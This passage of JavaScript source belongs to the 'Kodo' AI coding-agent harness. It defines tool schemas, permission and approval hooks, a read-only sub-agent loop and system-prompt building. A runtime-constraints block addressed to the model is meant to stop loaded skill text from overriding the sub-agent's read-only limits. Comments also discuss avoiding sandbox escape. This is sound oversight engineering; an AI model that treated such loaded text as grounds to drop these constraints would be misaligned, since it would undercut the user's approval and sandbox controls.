killed, producing nothing useful. Output is truncated; keep commands focused.",
      parameters: {
        type: "object",
        properties: {
          command: { type: "string" },
          timeout_ms: { type: "number", description: "Max runtime in ms for a normal (non-background) command (default 120000, max 300000)" },
          run_in_background: { type: "boolean", description: "Set true for anything that doesn't exit on its own — dev servers, watch mode, long-lived processes. Returns immediately with a task_id; check progress with bash_output, stop it with kill_shell." },
        },
        required: ["command"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "bash_output",
      description: "Check a background task's status and accumulated stdout/stderr since it started (use the task_id a run_in_background bash call returned). Call this after starting a server to confirm it actually came up before telling the user it's running — don't just assume it worked.",
      parameters: {
        type: "object",
        properties: { task_id: { type: "string" } },
        required: ["task_id"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "kill_shell",
      description: "Stop a background task started with bash's run_in_background (and its child processes). Use this before restarting the same server on a different port or command — starting a second instance without stopping the first usually just fails with a port-in-use error.",
      parameters: {
        type: "object",
        properties: { task_id: { type: "string" } },
        required: ["task_id"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "grep",
      description: "Fast regex search across the workspace (ripgrep). Use to locate symbols, routes, components, text.",
      parameters: {
        type: "object",
        properties: {
          pattern: { type: "string", description: "Regex or literal text to search" },
          glob: { type: "string", description: "Restrict to files matching this glob, e.g. '*.tsx' (optional)" },
        },
        required: ["pattern"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "glob",
      description: "Find files by name pattern, e.g. '**/page.tsx' or 'backend1/**/*.mjs'.",
      parameters: {
        type: "object",
        properties: { pattern: { type: "string" } },
        required: ["pattern"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "list_files",
      description: "List files and subdirectories under a path.",
      parameters: {
        type: "object",
        properties: { dir: { type: "string", description: "Relative directory (omit for root)" } },
      },
    },
  },
  {
    type: "function",
    function: {
      name: "todo_write",
      description: "Maintain your task list for multi-step work. Send the FULL list every time (content + status per item). Mark exactly one item in_progress while working on it; mark items completed as soon as they're done. Use for any request with 2+ distinct steps.",
      parameters: {
        type: "object",
        properties: {
          todos: {
            type: "array",
            items: {
              type: "object",
              properties: {
                content: { type: "string" },
                status: { type: "string", enum: ["pending", "in_progress", "completed"] },
              },
              required: ["content", "status"],
            },
          },
        },
        required: ["todos"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "list_memory_topics",
      description: "List memory topics Kodo learned in past sessions on this project.",
      parameters: { type: "object", properties: {} },
    },
  },
  {
    type: "function",
    function: {
      name: "read_memory_topic",
      description: "Read a memory topic file (patterns, preferences, project context from past sessions).",
      parameters: {
        type: "object",
        properties: { topic: { type: "string" } },
        required: ["topic"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "load_skill",
      description: "Load an expert knowledge pack by name (see AVAILABLE SKILLS in the system prompt). Load every relevant skill BEFORE making design/animation edits.",
      parameters: {
        type: "object",
        properties: { name: { type: "string" } },
        required: ["name"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "web_search",
      description: "Search the web (research, examples, reference sites). Follow up with fetch_url. Never use for questions about this codebase.",
      parameters: {
        type: "object",
        properties: { query: { type: "string" } },
        required: ["query"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "fetch_url",
      description: "Fetch a web page: readable text + design signals (colors, fonts, gradients). Use when the user references an external site.",
      parameters: {
        type: "object",
        properties: { url: { type: "string" } },
        required: ["url"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "verify_ui",
      description: "Actually exercise a page from a server YOU started (real headless browser via a Playwright MCP server — requires the project's .kodo/settings.json to declare mcpServers.playwright; if it doesn't, this returns an error telling you the exact config to add) to verify it renders and behaves — not just that it typechecks. Give it a URL, an optional batch of actions to perform first (click/fill/navigate/wait_for), and assertions to check afterward (visible/text_contains/no_console_errors/no_network_errors — defaults to no_console_errors if you omit assertions). Returns one compact result: pass/fail, per-action and per-assertion results, console/network error counts. On a FAILURE that has no console or network error to explain it (a 'silent' failure — the kind static checks and error logs both miss), it automatically takes a screenshot and, ONLY if a vision-capable model is configured for this user, asks it to describe what's visually wrong (you'll see that as vision_summary; if no vision model is configured you'll see vision_unavailable_reason instead — that's expected, not a failure on your part). Use this after building/editing a UI, once the dev server is confirmed up, before claiming the feature works.",
      parameters: {
        type: "object",
        properties: {
          url: { type: "string", description: "e.g. http://localhost:5173/ or http://localhost:5173/some/route" },
          actions: {
            type: "array",
            description: "Steps to run, in order, after navigating to url. Optional — omit for a simple load-and-check.",
            items: {
              type: "object",
              properties: {
                type: { type: "string", enum: ["navigate", "click", "fill", "wait_for"] },
                selector: { type: "string", description: "CSS selector — required for click/fill" },
                text: { type: "string", description: "Text to type (fill) or wait for (wait_for)" },
                seconds: { type: "number", description: "For wait_for: seconds to wait instead of waiting for text" },
                submit: { type: "boolean", description: "For fill: press Enter after typing" },
              },
              required: ["type"],
            },
          },
          assertions: {
            type: "array",
            description: "Checks to run after the actions. Omit to default to just [no_console_errors].",
            items: {
              type: "object",
              properties: {
                type: { type: "string", enum: ["visible", "text_contains", "no_console_errors", "no_network_errors"] },
                selector: { type: "string", description: "CSS selector — required for visible" },
                text: { type: "string", description: "Required for text_contains" },
              },
              required: ["type"],
            },
          },
        },
        required: ["url"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "ask_user",
      description: "Ask the user a clarifying question instead of guessing. Use when a requirement is genuinely ambiguous, you're about to make a consequential or hard-to-reverse choice, or you need information only the user has — not when you can find the answer yourself by reading the code. Call this ALONE (no other tool calls in the same turn) and wait for the answer before continuing. Prefer 2-4 concrete options when the choice is discrete; omit options for open-ended questions.",
      parameters: {
        type: "object",
        properties: {
          question: { type: "string", description: "The question to ask, phrased so the user can answer without extra context." },
          header: { type: "string", description: "Very short label, under 12 chars, e.g. 'Auth method'" },
          options: {
            type: "array",
            description: "2-4 mutually exclusive choices, if the decision is discrete. Omit entirely for a free-text/open-ended question.",
            items: {
              type: "object",
              properties: {
                label: { type: "string", description: "Short display text, 1-5 words" },
                description: { type: "string", description: "What this choice means or implies" },
              },
              required: ["label"],
            },
          },
        },
        required: ["question"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "review_patch",
      description: "Review, apply or discard the changes a worktree-isolated subagent produced. Those changes are NOT in the workspace until you approve them. Use action 'diff' to read the actual patch, 'approve' to apply it, 'reject' to discard it. Omit patch_id to list pending patches.",
      parameters: {
        type: "object",
        properties: {
          patch_id: { type: "string", description: "The patch_id returned by spawn_agent. Omit to list pending patches." },
          action: { type: "string", description: "'diff' (read it), 'approve' (apply to the workspace), or 'reject' (discard)." },
          reason: { type: "string", description: "Why, when rejecting." },
        },
      },
    },
  },
  {
    type: "function",
    function: {
      name: "subagent_status",
      description: "Check a background subagent started by spawn_agent (agent_type with background:true). Returns its status and, once finished, its report. Call this AFTER doing other useful work — don't poll in a tight loop. Omit task_id to list this session's background tasks.",
      parameters: {
        type: "object",
        properties: {
          task_id: { type: "string", description: "The task_id returned by spawn_agent. Omit to list all background tasks for this session." },
        },
      },
    },
  },
  {
    type: "function",
    function: {
      name: "read_mcp_resource",
      description: "Read a read-only resource exposed by a connected MCP server, addressed by its URI (see 'MCP resources' in the system prompt for what's available). Use this for context a server publishes — a document, record, schema, or config — rather than guessing at its contents. Only offered when a connected server actually publishes resources.",
      parameters: {
        type: "object",
        properties: {
          uri: { type: "string", description: "The resource URI exactly as listed (e.g. 'file:///schema.sql', 'db://users/42')" },
          server: { type: "string", description: "Optional server name, if the same URI could come from more than one" },
        },
        required: ["uri"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "spawn_agent",
      description: "Delegate a focused, READ-ONLY investigation to a sub-agent that runs in its own separate context window and returns a concise findings report. Use it to explore a large or unfamiliar area of the codebase, research how something works across many files, or gather context — WITHOUT filling your own context with every file it reads. The sub-agent can read, grep, glob, list, run read-only commands, search the web, and read memory; it CANNOT edit files or run commands that change anything — you make the actual edits yourself after reading its report. Give it a self-contained prompt (it doesn't see this conversation). You may spawn several for independent questions.",
      parameters: {
        type: "object",
        properties: {
          description: { type: "string", description: "3-5 word summary of the task, e.g. 'trace auth flow'" },
          prompt: { type: "string", description: "The complete, self-contained investigation task. Include enough context for the sub-agent to work without seeing this conversation. Tell it exactly what to report back." },
          agent_type: { type: "string", description: "Optional specialised agent defined in .kodo/agents/*.md (see AVAILABLE SUBAGENTS in the system prompt). Omit for the default read-only explorer." },
        },
        required: ["prompt"],
      },
    },
  },
];

// Tools a sub-agent may use — read-only only (it runs in plan mode, so any
// mutating call is also blocked defensively at the executor). No spawn_agent
// (depth is capped at 1) and no ask_user (sub-agents don't talk to the user).
const SUBAGENT_TOOL_NAMES = new Set([
  "read_file", "grep", "glob", "list_files", "bash",
  "list_memory_topics", "read_memory_topic", "web_search", "fetch_url",
]);
const SUBAGENT_TOOLS = AGENT_TOOLS.filter((t) => SUBAGENT_TOOL_NAMES.has(t.function.name));
const SUBAGENT_MAX_ITERATIONS = 12;

// The web-research tools, shared with the conversational answer node so it can
// also search/fetch when the model decides to (Claude Code-style: the model
// has the tools and chooses when to use them).
export const WEB_TOOLS = AGENT_TOOLS.filter((t) => t.function.name === "web_search" || t.function.name === "fetch_url");

const AGENT_TOOL_NAMES = new Set(AGENT_TOOLS.map((t) => t.function.name));

// Parse and return the FIRST complete JSON object/array at the front of a
// string, ignoring any trailing "extra data". String-aware brace matching so
// braces inside string literals don't throw off the depth count. Returns
// undefined if there's no complete value to salvage.
function firstJSONValue(s) {
  const start = s.search(/[{[]/);
  if (start === -1) return undefined;
  const open = s[start];
  const close = open === "{" ? "}" : "]";
  let depth = 0, inStr = false, esc = false;
  for (let i = start; i < s.length; i++) {
    const c = s[i];
    if (inStr) {
      if (esc) esc = false;
      else if (c === "\\") esc = true;
      else if (c === '"') inStr = false;
    } else if (c === '"') inStr = true;
    else if (c === open) depth++;
    else if (c === close && --depth === 0) {
      try { return JSON.parse(s.slice(start, i + 1)); } catch { return undefined; }
    }
  }
  return undefined;
}

// Canonicalize a tool call's `arguments` into a clean JSON string. Weak/streamed
// providers sometimes emit valid JSON followed by trailing junk (`{"a":1}{}` or
// `{...}\n\n`) or non-JSON entirely. JSON.parse tolerates that at execution
// (we catch and default to {}), but the RAW string stays on the assistant
// message — and re-sending it makes strict gateways reject the whole NEXT
// request ("400 Extra data: line 1 column N"), which kills the loop and forces
// a no-tools code-dump fallback. Normalizing here keeps the poison out of the
// conversation so the loop keeps editing files.
export function normalizeArgumentsJSON(raw) {
  if (raw == null) return "{}";
  if (typeof raw !== "string") {
    try { return JSON.stringify(raw); } catch { return "{}"; }
  }
  const trimmed = raw.trim();
  if (!trimmed) return "{}";
  try {
    return JSON.stringify(JSON.parse(trimmed));   // already clean → re-canonicalize
  } catch {
    const salvaged = firstJSONValue(trimmed);     // drop trailing "extra data"
    if (salvaged !== undefined) return JSON.stringify(salvaged);
    // Non-empty but truly unparseable (not just trailing junk) almost always
    // means the response was cut off mid-argument — e.g. a large write_file
    // `content` string hit the model's output token cap. Silently defaulting
    // to {} used to make the tool fail with a generic "path is required" and
    // no explanation, leaving the model to guess workarounds instead of
    // understanding the real cause. Surface it via a sentinel property that
    // executeTool checks before any tool-specific logic runs.
    return JSON.stringify({
      __kodo_parse_error__: `arguments (${trimmed.length} chars) could not be parsed as JSON — the response was very likely cut off mid-argument because the content was too large for one turn.`,
    });
  }
}

// Weak models sometimes emit malformed tool calls — no name, an unknown tool, or
// an `arguments` string that is valid JSON plus trailing junk. If those enter
// the conversation, the provider rejects the NEXT request (e.g. gapgpt "400
// Extra data"), killing the loop before any file is edited. Drop calls with a
// bad name, canonicalize every kept call's arguments to clean JSON, and ensure
// each has an id so the assistant/tool pairing stays valid.
// `validNames` must be the tools ACTUALLY offered for this run, not the static
// built-in set: MCP tools are discovered per workspace and appended at runtime,
// so validating against AGENT_TOOL_NAMES alone silently dropped every
// mcp__server__tool call — the model kept re-issuing it and the loop burned its
// whole budget without ever reaching the server. Callers that have no dynamic
// tools can omit it and get the built-in set.
export function sanitizeToolCalls(message, validNames = AGENT_TOOL_NAMES) {
  if (!Array.isArray(message?.tool_calls)) return message;
  const cleaned = message.tool_calls
    .filter((tc) => {
      const name = tc?.function?.name;
      return typeof name === "string" && name.trim() && validNames.has(name);
    })
    .map((tc, i) => ({
      id: tc.id || `call_${Date.now()}_${i}`,
      type: "function",
      function: {
        name: tc.function.name,
        arguments: normalizeArgumentsJSON(tc.function.arguments),
      },
    }));
  if (cleaned.length) message.tool_calls = cleaned;
  else delete message.tool_calls;
  return message;
}

const MUTATING_TOOLS = new Set(["edit_file", "write_file", "bash"]);
// bash commands that only read — exempt from ask-mode approval
const BASH_READONLY_RE = /^\s*(ls|cat|grep|rg|find|wc|head|tail|pwd|which|stat|du|tree|git\s+(status|log|diff|show|branch)|npm\s+(ls|view|outdated)|node\s+--check)\b[^;&|]*$/;

// Side-effect-free tools, safe to execute CONCURRENTLY when the model batches
// several into one turn — e.g. reading 6 related component files before
// editing them. This is the same principle Claude Code itself follows
// ("independent tool calls run in parallel"); kodo's loop used to run every
// call in a turn strictly one-at-a-time regardless, which cost real wall-clock
// time on read/research-heavy phases of a large build against the graph's
// hard 25-minute timeout. Anything that mutates state, spawns a persistent
// process, or needs a user decision (write_file/edit_file/bash/kill_shell/
// todo_write/spawn_agent/ask_user) stays sequential and in order — kodo's
// undo-snapshot/hook/approval machinery assumes one mutation completes before
// the next starts, and running those concurrently could reorder or race them.
const PARALLELIZABLE_TOOLS = new Set([
  "read_file", "grep", "glob", "list_files", "web_search", "fetch_url",
  "list_memory_topics", "read_memory_topic", "load_skill", "bash_output",
]);

// Tools that carry the ACTIVE PLAN rather than an observation — pinned so they
// survive every compaction cycle (the loop must never lose its own todo list or
// a decision the user made mid-task).
const PINNED_TOOLS = new Set(["todo_write", "ask_user"]);

/**
 * Resolve an approval that Kodo's rules say requires the user.
 *
 * PRECEDENCE (deliberate and deterministic — deny always wins):
 *   1. explicit `deny` rules   → hard block; PermissionRequest never fires and
 *                                cannot be overridden by any hook.
 *   2. PreToolUse hook         → may block before we ever get here.
 *   3. PermissionRequest hook  → fires ONLY when user approval would otherwise
 *                                be required. "deny" → denied. "allow" → skips
 *                                the prompt. "continue" → fall through to (4).
 *   4. user approval (askUser) → the human decides.
 *   5. PermissionDenied hook   → fires on any denial from (3) or (4).
 *
 * A hook can therefore auto-approve an "ask"-tier action or veto it, but can
 * never widen access past an explicit deny rule.
 */
async function resolveApproval(ctx, { kind, subject, question, header, payload }) {
  const pre = await ctx.fireHook?.("PermissionRequest", {
    kind, tool: subject, ...payload,
  }, { subject });

  if (pre?.decision === "block") {
    await ctx.fireHook?.("PermissionDenied", { kind, tool: subject, reason: pre.reason, ...payload }, { subject });
    return { approved: false, error: `Denied by a PermissionRequest hook: ${pre.reason || "no reason given"}` };
  }
  if (pre?.decision === "allow") return { approved: true, viaHook: true };

  if (!ctx.askUser) {
    return { approved: false, error: `This action requires approval under this workspace's rules, but asking isn't available in this context: "${String(subject).slice(0, 100)}"` };
  }

  ctx.emit?.({ type: "progress", stage: "planning", message: `❓ approval needed: ${String(subject).slice(0, 100)}` });
  let answer;
  try {
    answer = await ctx.askUser({
      question, header,
      options: [
        { label: "Allow", description: "Run it" },
        { label: "Deny", description: "Do not run it" },
      ],
    });
  } catch (err) {
    return { approved: false, error: `Approval cancelled: ${String(err?.message || err)}` };
  }

  if (!/^allow\b/i.test(String(answer || "").trim())) {
    await ctx.fireHook?.("PermissionDenied", { kind, tool: subject, reason: "denied by user", ...payload }, { subject });
    return { approved: false, error: `Not approved by the user (answered: "${String(answer || "").slice(0, 80)}").` };
  }
  return { approved: true };
}

// Claude Code parity: EndConversation-style calls bypass the tool hooks — they
// terminate the turn rather than acting on the workspace, so a PreToolUse gate
// on them could strand a session with no way to finish.
const HOOK_EXEMPT_TOOLS = new Set(["ask_user"]);

// Surface the common scalar args (path, command, url…) as top-level payload
// keys so a hook can use `{file}`/`{command}` placeholders without parsing the
// JSON on stdin. Objects/arrays stay inside `args` only.
function flattenHookArgs(args) {
  const out = {};
  if (!args || typeof args !== "object") return out;
  if (typeof args.path === "string") out.file = args.path;
  for (const k of ["command", "url", "pattern", "query"]) {
    if (typeof args[k] === "string") out[k] = args[k];
  }
  return out;
}

async function runAndFormatToolCall(toolCall, args, ctx, iteration, iterationBudget) {
  const toolName = toolCall.function.name;
  console.log(`[AgentLoop] ${iteration}/${iterationBudget} → ${toolName}(${JSON.stringify(args).slice(0, 140)})`);
  const startedAt = Date.now();

  // ── PreToolUse: the real gate. A blocking hook prevents execution entirely
  // and its reason is fed back as the tool result, so the model can adapt
  // instead of silently losing the call.
  if (ctx.fireHook && !HOOK_EXEMPT_TOOLS.has(toolName)) {
    const pre = await ctx.fireHook("PreToolUse", { tool: toolName, args, ...flattenHookArgs(args) }, { subject: toolName });
    if (pre.decision === "block") {
      const denial = { success: false, error: `Blocked by a PreToolUse hook: ${pre.reason || "no reason given"}` };
      const body = JSON.stringify(denial);
      ctx.recordEvent?.({
        kind: "tool", toolCallId: toolCall.id, toolName, toolArgs: args,
        content: body, status: "error", durationMs: Date.now() - startedAt,
      });
      await ctx.fireHook("PermissionDenied", { tool: toolName, args, reason: pre.reason }, { subject: toolName });
      return { role: "tool", tool_call_id: toolCall.id, content: body };
    }
  }

  const result = await executeTool(toolName, args, ctx);

  // ── PostToolUse / PostToolUseFailure: observation only — these run after the
  // fact and deliberately cannot veto a completed call.
  if (ctx.fireHook && !HOOK_EXEMPT_TOOLS.has(toolName)) {
    const failed = result?.success === false;
    await ctx.fireHook(failed ? "PostToolUseFailure" : "PostToolUse", {
      tool: toolName, args, ...flattenHookArgs(args),
      success: !failed,
      error: failed ? String(result?.error ?? "") : "",
      durationMs: Date.now() - startedAt,
    }, { subject: toolName });
  }

  const raw = JSON.stringify(result);
  const capped = raw.length > MAX_TOOL_OUTPUT_CHARS ? raw.slice(0, MAX_TOOL_OUTPUT_CHARS) + '..."[truncated]"}' : raw;
  // Working memory: record that this tool ran, on what, and whether it worked,
  // so a later turn can see the attempt instead of repeating it. Never throws
  // into the loop — a persistence failure must not abort real work.
  ctx.recordEvent?.({
    kind: "tool",
    toolCallId: toolCall.id,
    toolName: toolCall.function.name,
    toolArgs: args,
    content: capped,
    status: result?.success === false ? "error" : "ok",
    durationMs: Date.now() - startedAt,
    pinned: PINNED_TOOLS.has(toolCall.function.name),
  });
  // Task state machine: the same choke point feeds the controller, so it sees
  // exactly the calls that actually executed — not the ones the model merely
  // proposed. This is what lets it recognise a stuck path and know whether
  // verification has genuinely run.
  ctx.taskController?.recordToolCall({
    tool: toolName,
    args,
    ok: result?.success !== false,
    output: capped,
  });

  // ── Task memory: don't hand back a file the model already has ─────────────
  // An agent with no memory of what it has read has no reason not to read it
  // again, and re-reading a large unchanged file costs a turn and thousands of
  // tokens for nothing.
  //
  // The controller compares the content just read against what was delivered
  // before — PROVING it unchanged rather than assuming it — so a file the user
  // edited in their own editor mid-run still comes back in full. Runs after
  // the recording above so the controller's own accounting still sees the real
  // call and the real result; only what goes to the MODEL is condensed.
  //
  // A TRUNCATED read is deliberately excluded: the controller would be hashing
  // the full file while the model only ever received the first slice of it, so
  // "you already have this" would be a lie about content it never saw.
  const truncated = raw.length > MAX_TOOL_OUTPUT_CHARS;
  if (!truncated && toolName === "read_file" && result?.success !== false && typeof result?.content === "string") {
    const seen = ctx.taskController?.recallRead?.(args?.path, result.content);
    if (seen) {
      return {
        role: "tool",
        tool_call_id: toolCall.id,
        content: JSON.stringify({
          success: true,
          path: args.path,
          unchanged: true,
          note: `You already read ${args.path} earlier in this task and nothing has changed it since. Use the content you already have — do not read it again. To see a different part of the file, pass an offset.`,
        }),
      };
    }
    ctx.taskController?.rememberRead?.(args?.path, result.content);
  }
  return { role: "tool", tool_call_id: toolCall.id, content: capped };
}

/**
 * Tool dependency analyzer: split one turn's calls into ordered execution
 * groups, each either fully parallel or strictly sequential.
 *
 * The rule is about SIDE EFFECTS, not about files. A read cannot affect
 * anything another call observes, so any run of consecutive reads is one
 * parallel group. Anything that writes, runs a shell, spawns a process or
 * asks the user gets a group of its own — kodo's undo-snapshot, hook and
 * approval machinery all assume one mutation completes before the next
 * starts, and two concurrent approval prompts would be incoherent besides.
 *
 * ORDERING IS PRESERVED ABSOLUTELY. Groups run in order and results are
 * written back by original index, so a read issued before a write always
 * observes the pre-write state, and a read issued after it always observes
 * the post-write state. That is the whole dependency guarantee, and it falls
 * out of the grouping rather than needing a path-level analysis: since every
 * writer is alone in its group, no reader can ever straddle a write.
 *
 * `bash` stays sequential even when the command is read-only. It can hit the
 * approval flow, and a mis-classified command would reorder a real mutation —
 * a bad trade for a small speedup on a call that is usually slow for reasons
 * concurrency would not fix.
 *
 * Pure and total: no I/O, no ctx, unparseable arguments degrade to `{}`.
 * Exported so the scheduling can be tested directly, which is the thing that
 * was previously impossible — it was inline in the executor.
 */
export function planToolBatch(toolCalls) {
  const groups = [];
  for (let index = 0; index < (toolCalls?.length ?? 0); index++) {
    const toolCall = toolCalls[index];
    let args = {};
    try { args = JSON.parse(toolCall?.function?.arguments || "{}"); } catch { args = {}; }
    const entry = { index, toolCall, args };

    if (!PARALLELIZABLE_TOOLS.has(toolCall?.function?.name)) {
      groups.push({ parallel: false, calls: [entry] });
      continue;
    }
    const last = groups[groups.length - 1];
    if (last?.parallel) last.calls.push(entry);
    else groups.push({ parallel: true, calls: [entry] });
  }
  return groups;
}

// Execute one turn's tool calls: side-effect-free ones (PARALLELIZABLE_TOOLS)
// run concurrently; everything else runs strictly sequentially and in order,
// draining any pending parallel batch first so a mutation never starts before
// reads issued earlier in the same turn have resolved. Returns tool result
// messages in original call order — a mid-batch abort leaves later slots
// unfilled, which are dropped rather than returned as `undefined` holes.
// Shared by the main loop and the sub-agent loop (both need the same
// correctness properties); exported so it's directly testable without a live
// LLM call.
export async function executeToolCallsBatch(toolCalls, ctx, iteration, iterationBudget, abortSignal) {
  const results = new Array(toolCalls.length);
  for (const group of planToolBatch(toolCalls)) {
    if (abortSignal?.aborted) break;
    if (group.parallel) {
      await Promise.all(group.calls.map(({ index, toolCall, args }) =>
        runAndFormatToolCall(toolCall, args, ctx, iteration, iterationBudget)
          .then((r) => { results[index] = r; })));
      continue;
    }
    // Sequential group: one call, awaited before anything after it starts.
    for (const { index, toolCall, args } of group.calls) {
      if (abortSignal?.aborted) break;
      results[index] = await runAndFormatToolCall(toolCall, args, ctx, iteration, iterationBudget);
    }
  }
  return results.filter(Boolean);
}

// ── Sub-agent (spawn_agent) ────────────────────────────────────────────────────
// A self-contained, read-only agent loop with its OWN context window. The parent
// delegates a focused investigation; only the sub-agent's final report crosses
// back, so the parent's context stays lean. Runs in "plan" mode → every mutating
// tool is disabled at the executor. Depth is capped at 1 (no nested spawns).

const SUBAGENT_SYSTEM = `You are a focused sub-agent spawned by Kodo's main coding agent to investigate one thing and report back.

- You are READ-ONLY: read files, grep, glob, list, run read-only shell commands, search the web. You CANNOT edit files or change anything — don't try.
- You do NOT see the main conversation. Work only from the task you were given.
- Be efficient: gather exactly what the task asks for, then STOP.
- Finish with a plain-text report (no tool calls): concrete findings — file paths with line numbers, the specific answer, and anything the main agent needs to act. Lead with the answer, keep it tight. Don't pad.`;

/**
 * Subagent lifecycle wrapper. Fires around ACTUAL execution (not at tool-call
 * creation), and guarantees SubagentStop exactly once on every exit path —
 * success, error, or abort — via finally. Hook failures are swallowed so a
 * broken hook can never orphan the subagent or mask its findings.
 *
 * The subagent's own ctx is built inside the body with its own editedFiles /
 * readFiles / conversation, so nothing here can mutate parent state.
 */
async function runSubAgent(opts) {
  const { creds, root, description, abortSignal, fireHook, parentSessionId, parentRequestId, task, agent, maxTurns, worktree } = opts;
  const subagentId = opts.subagentId || `sub_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  const label = String(description || "investigating").slice(0, 60);
  const startedAt = Date.now();
  // The real agent identity, not a hardcoded string — hooks must be able to
  // tell a "reviewer" run from an "explorer" run.
  const base = {
    subagent_id: subagentId,
    subagent_type: agent?.name || "explorer",
    read_only: agent ? !agent.writeCapable : true,
    max_turns: Number(maxTurns) > 0 ? Number(maxTurns) : SUBAGENT_MAX_ITERATIONS,
    parent_session_id: parentSessionId ?? null, parent_request_id: parentRequestId ?? null,
    description: label, model: creds?.model ?? null, cwd: root,
    isolation: agent?.isolation || "none",
    background: !!agent?.background,
    worktree_path: worktree?.path || null,
    worktree_id: worktree?.worktreeId || null,
  };

  let stopFired = false;
  const fireStop = async (status, extra = {}) => {
    if (stopFired) return;
    stopFired = true;
    try {
      await fireHook?.("SubagentStop", { ...base, status, durationMs: Date.now() - startedAt, ...extra });
    } catch (err) { console.warn(`[Hooks] SubagentStop failed: ${err.message}`); }
  };

  try {
    await fireHook?.("SubagentStart", { ...base, task: String(task || "").slice(0, 2000), startedAt });
  } catch (err) { console.warn(`[Hooks] SubagentStart failed: ${err.message}`); }

  let status = "error";
  try {
    const result = await runSubAgentBody(opts);
    // The body reports outcomes as text rather than throwing, so classify it.
    status = abortSignal?.aborted || /^Sub-agent cancelled/i.test(result) ? "cancelled"
      : /^Sub-agent failed/i.test(result) ? "error"
        : "success";
    return result;
  } finally {
    await fireStop(status);
  }
}

async function runSubAgentBody({ creds, root, runtime, description, task, workspaceSnapshot, hooks, permissions, emit, abortSignal, agent, tools, maxTurns, skillBlock }) {
  const label = String(description || "investigating").slice(0, 60);
  emit?.({ type: "progress", stage: "exploring", message: `🔍 sub-agent: ${label}` });

  // Read-only ctx. permissionMode:"plan" makes edit_file/write_file/mutating
  // bash fail inside executeTool even if the sub-agent's model tries them.
  // isSubAgent guards against a sub-agent spawning further sub-agents. The
  // workspace's permission rules still apply to whatever read-only bash it
  // does run — deny rules always hold, and "ask" rules simply block (no
  // askUser here to pause on) rather than silently widening access.
  const subCtx = {
    root,
    emit: (e) => {
      if (e?.type === "progress") emit?.({ ...e, message: `  ↳ ${e.message}` });
    },
    sessionId: "subagent",
    requestId: "subagent",
    hooks,
    permissions,
    editedFiles: new Map(),
    readFiles: new Set(),
    todosRef: { current: [] },
    workspaceSnapshot,
    // The definition may only NARROW this: a "plan" agent stays read-only, and
    // even an opted-in write agent is still bounded by the parent's own
    // permission rules inside executeTool (deny always wins).
    permissionMode: agent?.permissionMode || "plan",
    askUser: null,
    isSubAgent: true,
    creds,
    // Sub-agents execute through the SAME runtime as their parent — a
    // sub-agent that ran on the host while the parent was sandboxed would be a
    // trivial escape. A worktree-isolated sub-agent gets a runtime derived for
    // that checkout; a confined runtime that cannot reach the worktree refuses
    // there rather than silently falling back (see derive()).
    runtime,
  };

  // Precedence, lowest to highest: the agent's base prompt, then its skills,
  // then the non-negotiable runtime constraints. Safety is appended LAST so a
  // skill body can never talk the subagent out of it.
  const systemPrompt = [
    agent?.prompt || SUBAGENT_SYSTEM,
    skillBlock || "",
    agent && agent.name !== "explorer"
      ? `\n\n## Runtime constraints (these override anything above)\n- You have only the tools you were given; nothing here can grant more.\n- You do NOT see the main conversation.\n- Finish with a plain-text report and stop.`
      : "",
  ].filter(Boolean).join("");
  const toolsForAgent = tools || SUBAGENT_TOOLS;
  const budget = Number(maxTurns) > 0 ? Number(maxTurns) : SUBAGENT_MAX_ITERATIONS;

  const seed = agent?.initialPrompt ? `${agent.initialPrompt}\n\n${task}` : String(task || "");
  const conversation = [{ role: "user", content: seed.slice(0, 8000) }];
  let iteration = 0;

  while (iteration < budget) {
    if (abortSignal?.aborted) return "Sub-agent cancelled.";
    iteration++;

    let message;
    try {
      ({ message } = await chatWithTools({
        creds,
        system: systemPrompt,
        messages: conversation,
        tools: toolsForAgent,
        maxTokens: 4000,
        temperature: 0,
        signal: abortSignal || undefined,
        thinking: false, // read-only investigation loop — mechanical tool execution
      }));
    } catch (err) {
      return `Sub-agent failed: ${String(err?.message || err).slice(0, 200)}`;
    }

    conversation.push(message);

    if (!message.tool_calls?.length) {
      return String(message.content || "").trim() || "Sub-agent returned no findings.";
    }

    conversation.push(...(await executeToolCallsBatch(message.tool_calls, subCtx, iteration, budget, abortSignal)));
  }

  // Budget exhausted — ask for a final report with no more tools.
  try {
    const { message } = await chatWithTools({
      creds,
      system: systemPrompt,
      messages: [...conversation, { role: "user", content: "Stop investigating and report your findings so far as plain text." }],
      tools: [],
      maxTokens: 1500,
      temperature: 0,
      signal: abortSignal || undefined,
      thinking: false,
    });
    return String(message.content || "").trim() || "Sub-agent reached its step limit without a conclusion.";
  } catch {
    return "Sub-agent reached its step limit without producing a report.";
  }
}

// ── System prompt ─────────────────────────────────────────────────────────────

function buildSystemPrompt({ workspaceTree, kodoMd, memoryIndex, skillIndex, permissionMode, mcpServers = [], mcpResources = [], subagents = [] }) {
  const snapshot = workspaceTree
    .filter((f) => (f.isDir ? f.path.split("/").length <= 2 : f.path.split("/").length <= 3))
    .slice(0, 150)
    .map((f) => (f.isDir ? `${f.path}/` : f.path))
    .join("\n");

  const memorySection = memoryIndex
    ? `\n## Agent memory (learned in past sessions)\n${memoryIndex}\nUse read_memory_topic to load a topic in full.\n`
    : "";

  const skillSection = skillIndex.length
    ? `\n## Available skills (load with load_skill when relevant)\n${skillIndex.map((s) => `- ${s.name} — ${s.description}`).join("\n")}\n`
    : "";

  // Only worth listing when a project actually defines specialised agents;
  // otherwise the default explorer needs no explanation.
  const subagentSection = subagents.some((a) => !a.builtin)
    ? `\n## Available subagents (spawn_agent agent_type)\n${subagents.map((a) => `- \`${a.name}\`${a.builtin ? " (default)" : ""} — ${a.description}${a.writeCapable ? " [can edit files]" : " [read-only]"}`).join("\n")}\nPass agent_type to spawn_agent to use one; omit it for the default read-only explorer.\n`
    : "";

  const kodoSection = kodoMd
